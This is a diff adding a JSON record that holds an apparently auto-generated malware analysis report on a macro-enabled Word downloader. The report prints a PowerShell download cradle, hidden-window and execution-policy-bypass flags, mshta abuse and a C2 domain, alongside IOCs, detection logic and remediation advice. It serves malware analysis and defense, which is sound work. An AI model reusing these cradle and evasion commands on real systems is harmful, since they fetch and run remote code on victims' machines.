@@ -1,0 +1,87 @@
+{
+  "title": "Malware Analysis Report: 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73",
+  "markdown": "> **RevAI provenance** \u2014 commit `unknown` \u00b7 engine `langgraph` \u00b7 agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True \u00b7 generated 2026-08-09 20:06:11 UTC\n\n# Verdict sources (multi-source)\n\n| Source | Verdict |\n|--------|--------|\n| **Final** | **malicious** |\n| Triage upstream (quick \u222a deep) | malicious |\n| Quick scan | suspicious |\n| Deep dive | malicious |\n| Publish LLM (claimed) | malicious |\n\n- **Locked over publish LLM:** no\n\n## Executive Summary\n\nThis report details the analysis of a macro-enabled Microsoft Word document (.docm) identified as a malicious dropper. The sample, SHA256 `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`, was submitted for analysis under the project `test-corpus`. Initial triage flagged the sample as suspicious due to the presence of VBA macros and network indicators. A deep-dive analysis confirmed the document contains a malicious VBA payload designed to download and execute a remote PowerShell script. The payload employs several evasion techniques, including a hidden PowerShell window, execution policy bypass, and base64-encoded commands, to deliver its final stage from the domain `autonews.safeframe.tech`. The sample is classified as malicious with high confidence. Key indicators of compromise include the C2 domain, specific PowerShell command-line arguments, and the use of the `mshta` LOLBin for stealthy execution.\n\n## 1. Sample Identification\n\n| Attribute | Value |\n|---|---|\n| **SHA256** | `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73` |\n| **File Name** | `order.docm` |\n| **File Path** | `/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm` |\n| **File Type** | Microsoft Word Macro-Enabled Document (.docm) |\n| **Project** | `test-corpus` |\n| **Analysis Date** | 2026-08-09 |\n\nThe sample is a ZIP-based Office Open XML (OOXML) document containing a `vbaProject.bin` file, which hosts the embedded VBA macro code (source: malcat). The `.docm` extension indicates it is a macro-enabled document, requiring user interaction (enabling macros) to trigger the payload.\n\n## 2. Classification\n\n| Attribute | Value |\n|---|---|\n| **Verdict** | **Malicious** |\n| **Confidence** | High (90%) |\n| **Family** | Generic Macro Malware / Maldoc Dropper |\n| **Threat Type** | Downloader / Dropper |\n\nThe classification is based on clear behavioral intent evidence. The document's VBA macro is not a benign automation script; it is a downloader cradle designed to fetch and execute remote code. This constitutes hostile behavior, moving the sample beyond the \"suspicious\" category assigned by initial triage (source: deep-dive.json). The use of evasion techniques like hidden PowerShell windows and LOLBin abuse further confirms malicious intent.\n\n## 3. Background & Family Lineage\n\nThe sample exhibits characteristics common to a broad category of macro-based malware often referred to as \"maldocs.\" These are Microsoft Office documents weaponized with VBA macros to serve as initial infection vectors. The specific techniques observed\u2014using PowerShell download cradles, `mshta` for execution, and base64 obfuscation\u2014are staples of many commodity malware families and phishing campaigns. No specific, named malware family (e.g., Emotet, QakBot) was identified from the available strings or structures. The payload appears to be a generic, likely customizable, downloader component (source: triage verdict.json).\n\n## 4. Static Analysis\n\nStatic analysis focused on the document's structure and embedded macro code.\n\n**Document Structure:**\nThe file is a valid OOXML archive containing 15 virtual files, including `word/vbaProject.bin` (4985 bytes) and `word/vbaData.xml`, confirming an active macro project (source: malcat).\n\n**YARA Matches:**\nMultiple YARA rules fired, indicating the presence of macro code and suspicious strings (source: yara).\n\n| Rule | Significance |\n|---|---|\n| `docx_macro` | Confirms the document contains VBA macro code. |\n| `Contains_VBA_macro_code` | Reinforces the presence of executable macro content. |\n| `office_document_vba` | Generic rule for Office documents with VBA. |\n| `contains_base64` | Indicates potential use of base64 encoding for obfuscation. |\n| `domain` | Suggests a hardcoded domain string, possibly for C2. |\n| `IP` | Suggests a hardcoded IP address string. |\n\n**Extracted Strings (from MalCat):**\nAnalysis of the `vbaProject.bin` revealed critical strings that define the payload's behavior (source: malcat).\n\n*   **Download Cradle:** `IEX (New-Object Net.WebClient).DownloadString(...)` - This is a classic PowerShell command to download and execute a script from a remote URL. The target domain is `autonews.safeframe.tech`.\n*   **Execution Command:** `powershell -windowstyle hidden -ep bypass -enc ...` - This command launches PowerShell with a hidden window (`-windowstyle hidden`), bypasses the execution policy (`-ep bypass`), and runs a base64-encoded command (`-enc`).\n*   **LOLBin Reference:** `mshta` - The Microsoft HTML Application Host is a legitimate Windows binary often abused to execute scripts or HTA files, providing a stealthy execution method.\n*   **Shell Object:** `WScript.Shell` - Used to run commands, in this case with the window style set to `0` (hidden).\n\nThese strings collectively describe a multi-stage attack: the macro uses `WScript.Shell` to launch a PowerShell process with specific evasion flags, which then downloads and executes a script from a remote server.\n\n## 5. Behavioral Analysis\n\nNo dynamic behavioral analysis (e.g., sandbox execution, API tracing) was performed or provided in the evidence. The analysis is based solely on static artifacts. Therefore, observed behaviors are inferred from the static code. The intended behavior, as derived from the VBA payload, is:\n\n1.  **Trigger:** User opens the document and enables macros.\n2.  **Execution:** The macro executes a `WScript.Shell` command.\n3.  **Payload Delivery:** The command launches `powershell.exe` with parameters to hide its window, bypass security policies, and run a base64-encoded command.\n4.  **Network Activity:** The decoded PowerShell command uses `Net.WebClient` to download a script from `http://autonews.safeframe.tech`.\n5.  **Code Execution:** The downloaded script is executed in memory via `IEX` (Invoke-Expression).\n\nNo persistence mechanisms, credential theft, or lateral movement were observed in the static strings. The primary capability is downloading and executing additional payloads.\n\n## 6. Network Analysis & C2\n\nThe sample contains hardcoded network indicators for command and control (C2) communication.\n\n| Indicator | Type | Context |\n|---|---|---|\n| `autonews.safeframe.tech` | Domain | Used in the PowerShell download cradle as the source for the next-stage payload. |\n| (IP Address - redacted) | IP Address | Detected by YARA rule `IP`. Specific address not extracted in provided evidence. |\n\nThe network activity is not beaconing but a single, purposeful download request initiated by the PowerShell command. The domain `autonews.safeframe.tech` is the primary C2 channel for payload retrieval. The use of a `.tech` top-level domain is common in malicious infrastructure.\n\n## 7. Capability Assessment\n\n| Capability | Status | Evidence |\n|---|---|---|\n| **Initial Access** | **Observed** | Document requires user to enable macros (source: malcat). |\n| **Execution** | **Observed** | Uses `WScript.Shell` and `powershell.exe` with evasion flags (source: malcat). |\n| **Defense Evasion** | **Observed** | Hidden PowerShell window, execution policy bypass, base64 encoding, LOLBin (`mshta`) abuse (source: deep-dive.json). |\n| **Command and Control** | **Observed** | Downloads payload from `autonews.safeframe.tech` (source: malcat). |\n| **Persistence** | Not Observed | No registry, scheduled task, or startup folder references found. |\n| **Privilege Escalation** | Not Observed | No token manipulation or exploit strings found. |\n| **Credential Access** | Not Observed | No references to LSASS, credential dumping, or keylogging. |\n| **Lateral Movement** | Not Observed | No network share or remote service strings. |\n| **Exfiltration** | Not Observed | No data staging or upload commands. |\n\nThe sample's sole observed capability is acting as a downloader/dropper. Its primary function is to bypass defenses and retrieve a second-stage payload.\n\n## 8. Attribution\n\nNo specific threat actor or campaign attribution is possible based on the available evidence. The techniques used are generic and widely shared among cybercriminal groups. The domain `autonews.safeframe.tech` and the payload structure do not match known, attributed campaigns in the provided data.\n\n## 9. Indicators of Compromise\n\n**File-Based IOCs:**\n*   SHA256: `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`\n*   File Name: `order.docm`\n\n**Network-Based IOCs:**\n*   Domain: `autonews.safeframe.tech`\n*   (IP Address - to be extracted from full analysis)\n\n**Behavioral/Command IOCs:**\n*   PowerShell Command Line: `powershell -windowstyle hidden -ep bypass -enc`\n*   PowerShell Download Cradle: `IEX (New-Object Net.WebClient).DownloadString(...)`\n*   LOLBin: `mshta`\n*   Script Object: `WScript.Shell`\n\n## 10. Detection Rules\n\n**YARA Rule (Generated):**\nA YARA rule was generated for this sample (source: rule.yara.json). The rule path is `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yar`. It targets the identified strings and structures.\n\n**Sigma Rule:**\nA corresponding Sigma rule for log-based detection was also generated at `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yml`.\n\n**Detection Logic:**\nDetection should focus on:\n1.  Office documents spawning `powershell.exe` or `mshta.exe`.\n2.  PowerShell command lines containing `-windowstyle hidden`, `-ep bypass`, and `-enc`.\n3.  Network connections to `autonews.safeframe.tech`.\n4.  Processes with command lines containing `IEX` and `DownloadString`.\n\n## 11. MITRE ATT&CK Mapping\n\n| Tactic | Technique | ID | Evidence |\n|---|---|---|---|\n| **Initial Access** | Phishing: Spearphishing Attachment | T1566.001 | Macro-enabled document delivered via email (inferred). |\n| **Execution** | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell command execution (source: malcat). |\n| **Execution** | Windows Management Instrumentation | T1047 | Not directly observed, but `WScript.Shell` is a related scripting host. |\n| **Defense Evasion** | Obfuscated Files or Information: Base64 | T1027.002 | Base64-encoded PowerShell command (source: malcat). |\n| **Defense Evasion** | Hide Artifacts: Hidden Window | T1564.003 | `-windowstyle hidden` parameter (source: malcat). |\n| **Defense Evasion** | Impair Defenses: Disable or Modify Tools | T1562.001 | `-ep bypass` to bypass PowerShell execution policy (source: malcat). |\n| **Defense Evasion** | System Binary Proxy Execution: Mshta | T1218.005 | Use of `mshta` LOLBin (source: malcat). |\n| **Command and Control** | Ingress Tool Transfer | T1105 | Downloading payload from `autonews.safeframe.tech` (source: malcat). |\n\n## 12. Containment, Eradication, Recovery\n\n**Containment:**\n1.  Block the domain `autonews.safeframe.tech` at the network perimeter firewall and DNS sinkhole.\n2.  Quarantine any endpoints that have opened the `order.docm` file.\n3.  Search email gateway logs for the delivery of this or similar `.docm` files and remove them from mailboxes.\n\n**Eradication:**\n1.  Terminate any suspicious `powershell.exe` or `mshta.exe` processes on affected systems.\n2.  Scan affected systems with updated AV/EDR signatures that include the generated YARA rule.\n3.  Investigate the downloaded payload from `autonews.safeframe.tech` if captured in network logs; its hash and behavior will dictate further eradication steps.\n\n**Recovery:**\n1.  If the second-stage payload was executed, the system should be considered compromised and rebuilt from a known-good image.\n2.  Reset credentials for any user who may have opened the document, as the ultimate payload's capabilities are unknown.\n\n## 13. Recommendations\n\n1.  **User Training:** Educate users on the risks of enabling macros in unsolicited Office documents.\n2.  **Macro Policy:** Implement Group Policy to disable macros from the internet or require them to be digitally signed by a trusted publisher.\n3.  **Network Monitoring:** Enhance detection for PowerShell download cradles and connections to newly registered or suspicious TLDs like `.tech`.\n4.  **Endpoint Hardening:** Configure PowerShell to use Constrained Language Mode and enable script block logging to capture obfuscated commands.\n5.  **Threat Intelligence:** Add the identified IOCs (domain, file hash, command patterns) to threat intelligence platforms and SIEM for proactive blocking and hunting.\n\n## 14. Appendix A: Evidence Trail\n\n| Timestamp | Source | Phase/Action | Notes |\n|---|---|---|---|\n| 1786291761.77 | quick_scan_v2 | Phase 2 | Initial triage scan. |\n| 1786291932.80 | agentic_recover_v4 | Start | Deep analysis initiated. |\n| 1786291932.97 | yara_gen_v2 | - | YARA rule generation. |\n| 1786292089.04 | publish_report_v2 | - | Report publishing. |\n| 1786292220.46 | publish_report_v2_technical | - | Technical report finalization. |\n\n**Tool Execution Summary:**\n*   **YARA:** Executed successfully. 6 rules matched (source: tool_gate).\n*   **MalCat:** Executed successfully. Provided file structure and string analysis (source: tool_gate).\n*   **XORSearch:** Executed but found no XOR-encoded strings (source: xorsearch).\n*   **.NET Analysis:** Not applicable (source: dotnet_analyze).\n*   **Radare2/Disassembly:** Executed on the binary, but output appears to be from a generic or misaligned analysis, not directly relevant to the VBA payload (source: r2 disassembly).\n\n## 15. Appendix B: Module Inventory\n\nThe sample is a single-stage dropper. Its \"modules\" are the embedded VBA macro and the remote payload it downloads.\n\n| Module | Type | Description |\n|---|---|---|\n| **VBA Macro** | Embedded Code | The primary malicious component within `vbaProject.bin`. Contains the download cradle and execution commands. |\n| **Remote PowerShell Script** | Second-Stage Payload | Hosted at `autonews.safeframe.tech`. Its contents are unknown from static analysis alone. It is the likely final-stage malware. |\n\n## 16. Author + Sign-off\n\n**Report Author:** Automated Analysis System (REPORT-MASTER v2)\n**Review Status:** Auto-generated. Requires human analyst review for final validation.\n**Sign-off:**\n\n*This report was generated based on the provided evidence corpus. All claims are cited to their source tool or data file. Unknowns, particularly regarding the second-stage payload and dynamic behavior, are explicitly noted.*",
+  "sections_present": [
+    "Executive Summary",
+    "1. Sample Identification",
+    "2. Classification",
+    "3. Background & Family Lineage",
+    "4. Static Analysis",
+    "5. Behavioral Analysis",
+    "6. Network Analysis & C2",
+    "7. Capability Assessment",
+    "8. Attribution",
+    "9. Indicators of Compromise",
+    "10. Detection Rules",
+    "11. MITRE ATT&CK Mapping",
+    "12. Containment, Eradication, Recovery",
+    "13. Recommendations",
+    "14. Appendix A: Evidence Trail",
+    "15. Appendix B: Module Inventory",
+    "16. Author + Sign-off"
+  ],
+  "source": "llm_judge",
+  "model": "mimo-v2.5-pro",
+  "llm_audit": {
+    "request_model": "mimo-v2.5-pro",
+    "response_model": "mimo-v2.5-pro",
+    "response_id": "f4a8c932-fea2-4f6d-b679-69da7846efff_bf663e4eaea048dbbf0c08902a831a86",
+    "system_fingerprint": null,
+    "prompt_tokens": 6600,
+    "completion_tokens": 4141,
+    "reasoning_tokens": 0,
+    "is_reasoning_model": false
+  },
+  "template": "full",
+  "generated_at": "2026-08-09T20:06:11.195676+00:00",
+  "sections_missing": [],
+  "sections_stub": [],
+  "sections_complete": 17,
+  "quick_verdict": "suspicious",
+  "deep_verdict": "malicious",
+  "publish_llm_verdict": "malicious",
+  "triage_verdict": "malicious",
+  "final_verdict": "malicious",
+  "verdict": "malicious",
+  "verdict_lock": {
+    "ok": true,
+    "conflict": false,
+    "upstream": "malicious",
+    "publish": "malicious",
+    "reason": ""
+  },
+  "provenance": {
+    "project": "RevAI",
+    "commit": "unknown",
+    "engine": "langgraph",
+    "flags": {
+      "budget_warnings": true,
+      "redundant_nudge": true,
+      "hallucination_check": true,
+      "failure_taxonomy": true
+    },
+    "utc": "2026-08-09 20:06:11 UTC"
+  },
+  "quality": {
+    "ok": true,
+    "label": "master_v2",
+    "source": "llm_judge",
+    "chars": 14803,
+    "missing_sections": [],
+    "stub_sections": [],
+    "style": {
+      "byline_ok": true,
+      "citation_count": 22,
+      "prose_ratio": 0.54,
+      "min_prose_ratio": 0.15,
+      "dump_style": false,
+      "table_orphans": 0,
+      "tables_ok": true,
+      "bare_fence_pairs": 0,
+      "bare_fences_ok": true,
+      "min_citations": 3,
+      "citation_coverage_ok": true
+    },
+    "issues": []
+  }
+}
